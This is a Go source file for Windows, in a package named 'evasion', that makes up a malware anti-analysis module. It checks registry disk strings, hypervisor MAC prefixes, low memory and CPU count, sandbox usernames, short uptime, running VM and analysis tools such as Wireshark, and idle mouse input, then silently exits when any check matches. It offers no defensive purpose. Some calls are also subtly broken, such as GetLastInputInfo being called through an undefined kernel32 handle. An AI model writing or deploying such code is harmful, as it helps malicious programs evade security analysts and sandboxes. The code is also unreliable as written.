//go:build windows
// +build windows

package evasion

import (
	"net"
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var sandboxUsernames = []string{
	"sandbox", "maltest", "malware", "virus", "sample", "test",
	"admin", "analyst", "user", "john", "honey", "cuckoo",
}

var sandboxProcesses = []string{
	"vmsrvc.exe", "vmusrvc.exe", "vboxservice.exe", "vboxtray.exe",
	"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
	"qemu-ga.exe", "qga.exe",
	"prl_tools.exe", "prl_cc.exe",
	"xenservice.exe",
	"df5serv.exe", "bdagent.exe", "bds.exe",
	"fiddler.exe", "wireshark.exe", "httpdebugger.exe",
}

var vmDiskKeywords = []string{
	"VBOX", "VMWARE", "QEMU", "VIRTUAL", "XENSRC", "PARALLELS",
}

// isVMByRegistry checks disk enum for VM signatures.
func isVMByRegistry() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Services\Disk\Enum`, registry.READ)
	if err != nil {
		return false
	}
	defer k.Close()

	val, _, err := k.GetStringValue("0")
	if err != nil {
		return false
	}
	up := strings.ToUpper(val)
	for _, kw := range vmDiskKeywords {
		if strings.Contains(up, kw) {
			return true
		}
	}
	return false
}

// isVMByMAC checks if any NIC has a known hypervisor OUI.
var vmMACPrefixes = []string{
	"00:0c:29", "00:50:56", "00:05:69", // VMware
	"08:00:27",                          // VirtualBox
	"52:54:00",                          // QEMU/KVM
	"00:15:5d",                          // Hyper-V
	"00:1c:14",                          // VMware
}

func isVMByMAC() bool {
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		mac := iface.HardwareAddr
		if len(mac) < 3 {
			continue
		}
		prefix := strings.ToLower(
			string([]byte{hexChar(mac[0] >> 4), hexChar(mac[0] & 0xf), ':',
				hexChar(mac[1] >> 4), hexChar(mac[1] & 0xf), ':',
				hexChar(mac[2] >> 4), hexChar(mac[2] & 0xf)}),
		)
		for _, p := range vmMACPrefixes {
			if prefix == p {
				return true
			}
		}
	}
	return false
}

func hexChar(b byte) byte {
	if b < 10 {
		return '0' + b
	}
	return 'a' + (b - 10)
}

type memoryStatusEx struct {
	Length                uint32
	MemoryLoad            uint32
	TotalPhys             uint64
	AvailPhys             uint64
	TotalPageFile         uint64
	AvailPageFile         uint64
	TotalVirtual          uint64
	AvailVirtual          uint64
	AvailExtendedVirtual  uint64
}

type systemInfo struct {
	ProcessorArchitecture     uint16
	Reserved                  uint16
	PageSize                  uint32
	MinimumApplicationAddress uintptr
	MaximumApplicationAddress uintptr
	ActiveProcessorMask       uintptr
	NumberOfProcessors        uint32
	ProcessorType             uint32
	AllocationGranularity     uint32
	ProcessorLevel            uint16
	ProcessorRevision         uint16
}

func isLowResources() bool {
	var ms memoryStatusEx
	ms.Length = uint32(unsafe.Sizeof(ms))
	modKernel32.NewProc("GlobalMemoryStatusEx").Call(uintptr(unsafe.Pointer(&ms)))
	if ms.TotalPhys > 0 && ms.TotalPhys < 2*1024*1024*1024 {
		return true
	}
	var si systemInfo
	modKernel32.NewProc("GetNativeSystemInfo").Call(uintptr(unsafe.Pointer(&si)))
	if si.NumberOfProcessors < 2 {
		return true
	}
	return false
}

type lastInputInfo struct {
	CbSize uint32
	DwTime uint32
}

func isSandboxUsername() bool {
	username := strings.ToLower(os.Getenv("USERNAME"))
	for _, bad := range sandboxUsernames {
		if username == bad {
			return true
		}
	}
	return false
}

func isShortUptime() bool {
	modKernel := windows.NewLazySystemDLL("kernel32.dll")
	getTickCount64 := modKernel.NewProc("GetTickCount64")
	r, _, _ := getTickCount64.Call()
	uptimeMs := uint64(r)
	return uptimeMs < 5*60*1000 // < 5 minutes
}

func isSandboxProcessRunning() bool {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if windows.Process32First(snap, &entry) != nil {
		return false
	}
	for {
		name := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
		for _, bad := range sandboxProcesses {
			if name == bad {
				return true
			}
		}
		if windows.Process32Next(snap, &entry) != nil {
			break
		}
	}
	return false
}

// hasRecentMouseActivity checks if there's been recent user input (cursor moved).
// Sandboxes typically show zero mouse activity.
func hasRecentMouseActivity() bool {
	var li lastInputInfo
	li.CbSize = uint32(unsafe.Sizeof(li))
	modKernel32.NewProc("GetLastInputInfo").Call(uintptr(unsafe.Pointer(&li)))
	tick, _, _ := modKernel32.NewProc("GetTickCount").Call()
	idleMs := uint32(tick) - li.DwTime
	// If idle > 10 minutes, suspicious
	return idleMs < uint32(10*time.Minute/time.Millisecond)
}

// evadeSandbox exits silently when a sandbox or analysis environment is detected.
func evadeSandbox() {
	if isVMByRegistry() ||
		isVMByMAC() ||
		isLowResources() ||
		isSandboxUsername() ||
		isShortUptime() ||
		isSandboxProcessRunning() ||
		!hasRecentMouseActivity() {
		os.Exit(0)
	}
}
